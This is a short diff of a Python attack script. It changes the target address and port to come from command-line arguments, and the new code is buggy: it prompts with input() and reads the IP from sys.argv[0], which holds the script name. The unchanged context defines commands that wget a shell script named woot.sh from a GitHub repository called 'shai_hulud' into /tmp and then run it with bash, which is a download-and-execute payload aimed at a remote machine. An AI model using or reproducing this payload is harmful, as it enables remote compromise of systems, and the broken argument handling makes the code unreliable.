@@ -10,8 +10,9 @@ import sys
 import base64
 import time
 
-ADDR = '0.0.0.0'
-PORT = 8825
+input("Please enter the following arguements - IP and Port.")
+ADDR = sys.argv[0]
+PORT = sys.argv[1]
 CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
 for cmdnum in range(len(CMD)):
